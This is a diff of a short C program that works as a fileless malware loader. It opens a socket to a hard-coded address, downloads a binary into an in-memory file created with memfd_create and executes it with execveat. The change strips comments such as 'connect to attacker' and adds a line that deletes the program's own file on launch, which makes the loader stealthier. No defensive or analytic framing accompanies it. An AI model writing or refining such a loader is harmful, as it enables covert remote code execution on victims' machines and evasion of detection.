@@ -13,7 +13,7 @@
 #define SYSCALL_execveat 322 
 #define AT_EMPTY_PATH 0x1000
 
-static inline int memfd_create(const char *name, unsigned int flags)         // wrapper for the memfd_create syscall
+static inline int memfd_create(const char *name, unsigned int flags)         
 {
 	return syscall(SYSCALL_memfd_create, name, flags);
 }
@@ -22,6 +22,7 @@ static inline int execveat(int fd, const char *name, int flags)
 {
 	return syscall(SYSCALL_execveat,fd, name, NULL, NULL, flags);
 }
+
 int	main(int argc, char *argv[], char *env[])
 {
 	int	fd;
@@ -29,18 +30,18 @@ int	main(int argc, char *argv[], char *env[])
 	unsigned long addr = 0x0100007f11110002;
 	unsigned char buf[BUF_SIZE];
 
-	// connect to attacker -> download from socket fd and write into fd 'a'
+	unlink(argv[0]);
 	s = socket(AF_INET, SOCK_STREAM, 0);
 	connect(s, (struct sockaddr*)&addr, 16);
-	fd = memfd_create("y", MFD_CLOEXEC);  // create fd in memory
+	fd = memfd_create("y", MFD_CLOEXEC);
 
 	while (1)
 	{
-		if ((l = recv(s, buf, BUF_SIZE, MSG_WAITALL)) <= 0)  // download
+		if ((l = recv(s, buf, BUF_SIZE, MSG_WAITALL)) <= 0)
 			break;
-		write(fd, buf, l);  // write into fd
+		write(fd, buf, l);
 	}
-	close(s); // close socket
-	execveat(fd, "", AT_EMPTY_PATH); // execute fd in memory
+	close(s);
+	execveat(fd, "", AT_EMPTY_PATH);
 	return (0);
 }
